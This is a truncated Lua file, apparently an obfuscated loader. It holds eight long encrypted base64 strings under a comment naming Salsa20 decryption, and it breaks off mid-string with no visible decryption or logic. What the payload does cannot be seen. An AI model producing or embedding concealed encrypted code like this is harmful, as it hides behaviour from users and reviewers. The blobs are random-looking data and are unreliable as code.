local _bfz = nil
local _gfc = ""

-- ========================================================
-- DESENCRIPTACIÓN (Salsa20)
-- ========================================================
do
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "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"
  local _b3 = "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"
  local _b4 = "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"
  local _b5 = "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"
  local _b6 = "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"
  local _b7 = "bbDma4+2zox92a3KY6kCroLnEglIUw/b8b0jmMsWrx2kgtmN6KaqyBYMYfeGPSGJXI6F/rYIAppGDd7ilmSmH7HiIMwgZkLaTjPhaST3m+UuFyuewnzflWKflDy3TKe89/XdgMf3pKgInsvKhY1mXevfVrEO5VUyNH/wQsi+FI/H7kEXpdPqS8d+kf7fs1c0NYYRCDAF4y6A3R65QnYpFUGkyXhQKGeIrwdsz2Yg4LvJlTSnyUlYnJiipyaTyqZO7QNZIqdiIED466R53Np7qcgWuxPVYLi0c4rYJO491MmPQq01XbpMWKVdMz/xNX/br6S8exLZ4pM8sslqIeZVRgWHM5UT41clJnYB/J6Apcee8ToHiMLcobdLYbt50zOQ2Yt82O+R8xLU7eoo0fqps2Tkp5K1F/eCi3tTh9rzy72JhgnRgiJX+YPOAsVPCvXgtX1uWUq4lJo967RL4SMLMV2ow/r0bs9vxBrbmKRsZNtjuXHWnWX09WChsd4mWD8HWQCDqYFnPyPO7s93GcUHTJo5I+bB52mZ7bg51AVwBMzd0uII3JUaLTtZyJHc5diftBayebOVDqRaMR8zWv1TtknzQGJ5ZMwjq773VbmK8D2qqMeEJhk0TuwygJlNmyd9W7OntyWpjfDsWvFPd2oP02jA7+0N7fORRrJ50viOL+f2HQMTaxKmZLGETc8FP5EfYf/j/l6EhNjJWMCZmN7yHVBawOhLmhlIU1ee+OqKkLiC1GbjPvXAAGULTOpX50sefPZFCzuZRr97zckdKHBaieGbHw4dpiz5fQErGDyE8+2xlH19sQzJAwd+XkUrU2IgITyYw58/bh9wivdJseBLibEmXuy+eejuFPXP7jgYTPG03pt9k2gss9nn5rlvnmQ6gDeKxQ2qWh0maJAAdHZ7RC25vFgR34/EACApVjdkM3knv3hvvTQIe4XZbe9PWyU1Kw6/IsydMSSKwZUEr5gUjk2GLcyrjsv+xHn8cHiE9NmzSVFwzXwaUh9uyIWIwEUVGLjPaBNk7Pt7MHHpXhmKMpPI6CHwsmQQEWjQDQtUt48gAGeQso354StC6ZtMqXVylZLMBnakRU1RpgRlQorVMhup3AA0BgoBdnix4SspbRA9bSOegNZQx1ezt7Gt6EgmVptRDdwM4CJ7rxrWxZzLaq9aEtyeCvL8b+XFxFUqEUYBiK8aD8EKiWSP/+bpvUNFaXXZPPArES3oxGiKykKRMQvtvpW7pEb7XQRyT6zLLChZmAC6vOlxAR9sSeXDTwRcG6Wwsp67lUmBNR3Z8xlJiGbnS8OvAmy7Edgqu8yFeCZE8UAqRiLPOYCmKcv16GWH5oVlnML1jUhPojDRIt8MPeBChjw8g3Uhz/3T0XAE/SNEqvzsLTjB82xc0QHDSZjlareDUtIo9fiXOOBmeRmPKrHBvxp6WtIsvGi7lXzg9qMPrbnvXkrXlQEEN96fzV/cLwTOof/JaUCMBYBHb9dd14vF0558jNdXT4mKrfv/7UMx8dx1LHGKMhxH2/8kdE5XJb3G0Jvu2oIXeiWYUiZ84xDsgu4bT5yGshcBD0sLZTpBr3kbcW86W4PLf8rErJzbueUdXTUqP6LcunKo+BPcrydI6tfXhM01S0Mp+HOnooF4Pikk+A+hYb3xrGtA5I6GxPaSPE0t+1xopfGGlB9Pm2qE7OaSUgcPgVoIvcpYJeToQ6xp1r7rQlJGzRt